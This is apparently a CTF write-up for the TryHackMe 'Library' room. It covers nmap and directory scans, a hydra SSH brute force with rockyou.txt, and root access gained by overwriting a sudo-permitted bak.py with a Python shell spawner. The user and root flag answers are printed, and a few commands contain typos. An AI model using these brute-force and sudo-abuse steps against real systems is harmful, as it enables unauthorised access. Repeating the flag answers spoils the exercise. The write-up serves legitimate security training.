<img width="2000" height="1125" alt="image" src="https://github.com/user-attachments/assets/d1452191-8a14-4cd5-9167-c890e3625aa1" />

# Library

boot2root machine for FIT and bsides guatemala CTF

<img width="1507" height="233" alt="image" src="https://github.com/user-attachments/assets/9c09d0ad-0d57-4f70-afa5-334cd464765b" />

---

# Task 1 - Introduction

Before proceeding with the following tasks, start the attached virtual machine by clicking the Start Machine button below.

The machine may take 3–5 minutes to initialize. Once it has started, you can access the Library Instance at `http://MACHINE_IP` using either the AttackBox or the TryHackMe VPN.

We always need to run full scans with Netdiscover, Nmap, Dirb, OR Gobuster **because they can take a lot of time.**

---

## Nmap (Golden Search)

```bash
nmap -Pn -p- -sC -sV IP -vvv -oA nmap_full
```

```bash
nmap -Pn -p- -sC -sV --script vuln 1vvv -oA nmap_full
```

---

## Dirb

Basic Directory Scan, gobuster

---

## Gobuster

```bash
gobuster dir -u http://IP/ -w /usr/share/wordlists/dirb/common.txt
```

Basic Scan, dirb

```bash
dirb http://IP
```

---

### Answer the questions below

> Update me..


# Task 2 - Library

> Start Lab Machine

---

## GTFOBin:

**GTFOBins** is a reference for Living off the Land (LotL) techniques, showing how legitimate Unix/Linux binaries can be abused for privilege escalation, shell access, file transfer, and other post-exploitation activities.

### Purpose:

Identify binaries that enable privilege escalation, command execution, or restricted shell escape.

### Use Cases:

- Privilege Escalation (SUID / sudo abuse)
- Restricted shell bypass
- File read/write abuse
- Command execution without direct access

---

## Privilege Escalation Steps:

### First Step: Check for Privilege Escalation Vectors:

```bash
sudo -l
```

- Lists your sudo privileges.
- Shows commands you can run with sudo.
- Identifies privilege escalation opportunities.

---

## Obtain an Interactive Shell:

### Python Method 1:

**GTFOBins – Python (Sudo)**

- If Python is allowed, use the GTFOBins command below.
- This may provide a privileged shell.

```bash
sudo python -c 'import os; os.system("/bin/sh")'
```

### Python Method 2:

- Spawns a pseudo-terminal (PTY).
- Provides a more interactive shell.
- Useful for upgrading a restricted shell.

```bash
sudo python -c 'import pty; pty.spawn("/bin/sh")'
```

---

## Locate SUID Binaries:

- Searches for SUID files.
- Identifies potential privilege escalation vectors.
- Suppresses error messages for cleaner output.

```bash
find / -perm -u=s -type f 2>/dev/null
```

- ***txt.....***

---

## `robots.txt`

**`robots.txt`**: Tells search engine bots which files or directories should not be crawled. **It is not a security feature.** In pentests and CTFs, it may reveal hidden directories or useful clues, so it should always be checked.

**Example:** `Disallow: /admin/` → Check [`http://target/admin/`](http://target/admin/).

---

## `changelog.txt`

**`changelog.txt`**: Contains the application's version history, updates, and bug fixes. During a pentest, it helps identify the **application version** and **research known vulnerabilities** for that version.

**Example:** `Version 7.4.3` → Search for known CVEs or exploits affecting version 7.4.3.

---

`pty.spawn("/bin/bash")` is used to upgrade a basic shell into a **fully interactive TTY shell** for better command execution and control during post-exploitation.

https://github.com/nixawk/hello-python2/blob/master/pty/spawn_shell.py

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```text
# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

# http://netsec.ws/?p=337

# import pty; pty.spawn("/bin/sh")
```

```python
import pty

pty.spawn("/bin/bash")
```

---

### Answer the questions below

> user.txt

**6d488cbb3f111d135722c33cb635f4ec**

> root.txt

**e8c8c6c256c35515d1d344ee0488c617**

# 1. Introduction

**We always need to run full scans with Netdiscover, Nmap, Dirb, OR Gobuster because they can take a lot of time.**

---

# 1. user.txt

Let’s start our target machine and get connected to the TryHackMe network. To start the machine, click the green “Start Machine” button at the top of the task. For the TryHackMe network, I’m using a Kali virtual machine so I’ll connect using OpenVPN. With that all set up, we can start scanning the machine.

**OpenVPN:**

https://tryhackme.com/r/access

### On Kali Linux:

```bash
┌──(kali㉿gokhan)-[~]
└─$ cd Desktop

┌──(kali㉿gokhan)-[~/Desktop]
└─$ sudo openvpn gokhan.ovpn
```

---

## Nmap

```bash
nmap -Pn -p- -sC -sV 10.146.140.254 -vvv -oA nmap_full
```

---

## Gobuster

```bash
gobuster dir -u http://10.145.138.124/ -w /usr/share/wordlists/dirb/common.txt
```

---

## Dirb

```bash
dirb http://10.145.138.124
```

---

## Hydra

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.65.143.127
```

```bash
touch users.txt
```

```bash
ls
```

```text
users.txt
```

```bash
nano users.txt
```

```text
meliodas
root
www-data
anonymous
```

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.65.143.127
```

---

## SSH

```bash
ssh meliodas@10.10.230.27
```

```bash
cat user.txt
```

---

```bash
sudo -l
```

```bash
ssh
```

# 2. Nmap Scan

For scanning, we’ll use nmap. We want the scan to list the services and be very verbose so we’ll use the sV and vv flags. The following will be the command we use.

---

## Combining Options

```bash
nmap -Pn -p- -sC -sV 10.10.108.95 -vvv -oA nmap_full
```

From the scan we find that the ports for SSH and HTTP are open.

```bash
root@ip-10-10-181-103:~# nmap -oA nmap_full 10.10.18.83
```
<img width="877" height="306" alt="image" src="https://github.com/user-attachments/assets/be046abe-f53d-4cd9-9429-3760e65535dd" />


# 3. Web Server Analysis

Now, let's check our web servers.

Enter the IP address in the browser and check the website.

<img width="1280" height="719" alt="image" src="https://github.com/user-attachments/assets/ddcccd41-dc55-46dd-a180-250ce439a323" />

We’re looking at a blog. One of the posts is by a user named `meliodas`, at the bottom of the page are three comments by `root`, `www-data`, and `Anonymous`. We may need to login as `meliodas` so let’s remember the name and check out the two directories we found in the Gobuster scan.

---

## Check Open Ports

Try ports `22` and `80` and check which one is working.

Check port `80` and look for any passwords, usernames, or other important information.

---
<img width="1920" height="936" alt="image" src="https://github.com/user-attachments/assets/a1de9ff7-73fb-4453-9bf0-09ccbebedf4d" />


## Basic Directory Scanning

HTTP is open, so let’s do a Gobuster scan OR Dirb to look for any interesting directories. We’ll use the `common.txt` wordlist, so the following will be the full command.

The file `common.txt` typically contains a list of commonly used directory and file names.

---

### Gobuster

```bash
gobuster dir -u http://10.10.108.95 -w /usr/share/wordlists/dirb/common.txt
```
<img width="963" height="440" alt="image" src="https://github.com/user-attachments/assets/66acdea6-ded6-43d7-83d3-885db224032f" />

---

### Dirb

```bash
dirb http://10.10.108.95
```
<img width="688" height="526" alt="image" src="https://github.com/user-attachments/assets/5fc6fe1c-1b9a-40dc-8352-8185cba58394" />

---

## robots.txt

```text
http://10.10.18.83/robots.txt
```
<img width="1920" height="498" alt="image" src="https://github.com/user-attachments/assets/f245e75c-dc70-480d-9e65-c1366c80e2dc" />


# 4. Brute Force Attack with Hydra

## How Do We Find Hydra on Kali Linux?

How do we find Hydra on Kali Linux?

We will use `hydra-graphical`.

We will do the setup.

---
<img width="601" height="706" alt="image" src="https://github.com/user-attachments/assets/721f367f-ba5b-417b-97a4-d132ae139083" />

## Hydra Graphical Setup

<img width="1036" height="724" alt="image" src="https://github.com/user-attachments/assets/fe2ed323-3b9d-4d39-b8df-80bf9cdbf27e" />

### Single Target

Single Target is our IP.

<img width="852" height="657" alt="image" src="https://github.com/user-attachments/assets/925ab123-6218-483a-bed6-c7f6ffd612ff" />


### Password List

Select the password list.

<img width="854" height="701" alt="image" src="https://github.com/user-attachments/assets/45d08542-27d1-4be8-a6f4-03908dbfbbf8" />


### Tuning

Under **Tuning**, select the first option.

<img width="846" height="649" alt="image" src="https://github.com/user-attachments/assets/f6cfbe8e-8d2a-4e07-a455-9224c5f41bfa" />

### Start

Click **Start**.

<img width="853" height="655" alt="image" src="https://github.com/user-attachments/assets/f2424d68-056f-4e98-b4c5-105268130b24" />


Select **Start** and press **Enter**.

---

<img width="1171" height="662" alt="image" src="https://github.com/user-attachments/assets/db0b796c-91b3-448e-b0bf-c47df38beeb9" />

## OR - Hydra Command Line

```bash
root@ip-10-10-188-73:~# hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.148.57
```

---

## OR

```bash
hydra -l meliodas -P /root/Tools/wordlists/rockyou.txt ssh://10.10.36.192
```

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.36.192
```
<img width="1180" height="526" alt="image" src="https://github.com/user-attachments/assets/40ac8026-bc1f-4a03-9f32-9bd65fa5a45d" />

---

## Could There Be Differences?

Results could vary if:

- **The rockyou.txt files were different:** If the wordlist at `/root/Tools/wordlists/` didn’t include the correct password, the second command would fail.
- **Network issues occurred:** If the target SSH service was unreachable during one command, that attempt would fail.

<img width="768" height="434" alt="image" src="https://github.com/user-attachments/assets/52044e08-857e-471f-9271-01ed37a5962b" />

# 5. SSH Access

```bash
root@ip-10-10-188-73:~# ssh meliodas@10.10.148.57
```

<img width="1490" height="603" alt="image" src="https://github.com/user-attachments/assets/6ca70808-948d-4f5e-8385-eecd3d9e0ff4" />

# 6. Privilege Escalation

## What We Learned Today:

1. **How to use Nmap** – We learned how to perform network scans using Nmap.
2. **Web Server Analysis** – We explored how to analyze a web server.
3. **Hydra for Brute Force Attacks** – We used Hydra to perform a brute force attack and exploited the account to find our first flag.
4. **Privilege Escalation** – Now, we need to perform privilege escalation. What is the first step?

To start privilege escalation, the first thing we often do is check for misconfigurations or vulnerabilities that allow us to gain higher privileges.

### Example:

- Running `sudo -l` can help you determine if you have any permissions to run commands with elevated privileges (such as root) without needing the root password. If it shows `yes` for any command, it may be a potential privilege escalation vesudo suctor.

---

# 1. way root.txt

The first thing I always check when seeing if I can escalate privileges is to look at any sudo permissions our user is given. We can use `sudo -l` to list these.

```bash
meliodas@ubuntu:~$ echo "import os; os.system('/bin/bash')" >> bak.py
-bash: bak.py: Permission denied

meliodas@ubuntu:~$ rm bak.py
rm: remove write-protected regular file 'bak.py'? yes

meliodas@ubuntu:~$ echo "import os; os.system('/bin/bash')" >> bak.py

meliodas@ubuntu:~$ ls
bak.py user.txt

meliodas@ubuntu:~$ cat bak.py
import os; os.system('/bin/bash')

meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py

root@ubuntu:~# ls
bak.py user.txt

root@ubuntu:~# cd ..

root@ubuntu:/home# ls
meliodas

root@ubuntu:/home# cd ..

root@ubuntu:/# ls
bin boot dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old

root@ubuntu:/# cd root

root@ubuntu:/root# ls
root.txt

root@ubuntu:/root# cat root.txt
e8c8c6c256c35515d1d344ee0488c617

root@ubuntu:/root#
```

---

# 2. way root.txt

```bash
sudo -l
```
<img width="1406" height="174" alt="image" src="https://github.com/user-attachments/assets/8ad53bf2-1b4d-40f3-b4ec-47d0bf2bc7cc" />

---

You can open the Python file named `bak.py` by utilizing Python commands.

Visit [GTFOBins](https://gtfobins.github.io/gtfobins/python/) for useful Python commands.

From the **sudo** section, use the following command as an example:

```bash
sudo python -c 'import os; os.system("/bin/sh")'
```
<img width="1360" height="111" alt="image" src="https://github.com/user-attachments/assets/1a1189a3-e77a-41e8-a7ff-93c8c22dbf00" />

---

Since we don’t know the password and don’t have root privileges, the command didn’t work.

This message indicates that `meliodas` is not authorized to execute the `python -c` command as root using `sudo`.

In this case, we could try running it via a shell, but I already tried that, and it didn’t work either.

So, let’s delete this file and create a new executable file with the same name.

---
<img width="791" height="226" alt="image" src="https://github.com/user-attachments/assets/17daa1b3-3525-4135-bef9-9398d755750c" />

Run the following command to delete the existing `bak.py` file:

```bash
rm bak.py
```

Then, create a new file with the same name:

```bash
touch bak.py
```
<img width="366" height="183" alt="image" src="https://github.com/user-attachments/assets/6142ca1f-9950-4f69-9090-de84a9dfb2dd" />

---

```bash
nano bak.py
```

```python
import os
os.system("/bin/sh")
```
<img width="322" height="95" alt="image" src="https://github.com/user-attachments/assets/39dce290-125f-499f-baf0-d92af36f3ed4" />

```text
crtl o
enter
ctrl x
```
<img width="1073" height="677" alt="image" src="https://github.com/user-attachments/assets/57b63035-53f8-44bf-a4d0-02d3b7dbae9c" />


<img width="1407" height="786" alt="image" src="https://github.com/user-attachments/assets/b335b900-7d68-4c88-87d3-2bfa04457940" />

```bash
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
```

```bash
meliodas@ubuntu:~$ sudo -l

Matching Defaults entries for meliodas on ubuntu:
env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User meliodas may run the following commands on ubuntu:
(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

meliodas@ubuntu:~$ sudo python -c 'import os; os.system("/bin/sh")'

[sudo] password for meliodas:
Sorry, user meliodas is not allowed to execute '/usr/bin/python -c import os; os.system("/bin/sh")' as root on ubuntu.

meliodas@ubuntu:~$ ls
bak.py user.txt

meliodas@ubuntu:~$ rm bak.py

meliodas@ubuntu:~$ ls
user.txt

meliodas@ubuntu:~$ touch bak.py

meliodas@ubuntu:~$ ls
bak.py user.txt

meliodas@ubuntu:~$ cat bak.py

meliodas@ubuntu:~$ ls
bak.py user.txt

meliodas@ubuntu:~$ cat bak.py

meliodas@ubuntu:~$ ls
bak.py user.txt

meliodas@ubuntu:~$ nano bak.py

meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py

# whoami
root

# cd /root

# ls
root.txt

# cat root.txt
e8c8c6c256c35515d1d344ee0488c617
```

---

# 3. way root.txt

### #Privilege Esc

Now, we need be root user to get the flag of **root.txt**. By typing `sudo -l`, you can see that we can run the bak.py file at the path `/home/meliodas`.


<img width="1205" height="123" alt="image" src="https://github.com/user-attachments/assets/810b47e8-a7c3-4e89-a59a-ed42e98a7c07" />

But by running it, we just get a Permission denied error as shown:


<img width="859" height="59" alt="image" src="https://github.com/user-attachments/assets/56f82476-124a-4fe7-a16e-f165f1e9a2de" />

As we have seen from the earlier steps, we don’t have the permission to edit the file, but we still can delete it and re-create it with our TTY spawner.

```bash
sudo ptyhon /home/meliodas/bak.py
```

```bash
echo 'import pty; pty.spawn("/bin/sh")' > /home/meliodas/bak.py
```

```bash
sudo python /home/meliodas/bak.py
```

<img width="851" height="158" alt="image" src="https://github.com/user-attachments/assets/f53e3762-76e7-486b-9047-a51a0956ee09" />

Finally we got the root access to the system. Let’s check for **root.txt** file.



<img width="482" height="124" alt="image" src="https://github.com/user-attachments/assets/5b8c2a4f-2a35-4806-948c-135e0bd5e020" />


_Answer the questions below:_

**user.txt**

_**6d488cbb3f111d135722c33cb635f4ec**_
**root.txt**

_**e8c8c6c256c35515d1d344ee0488c617**_















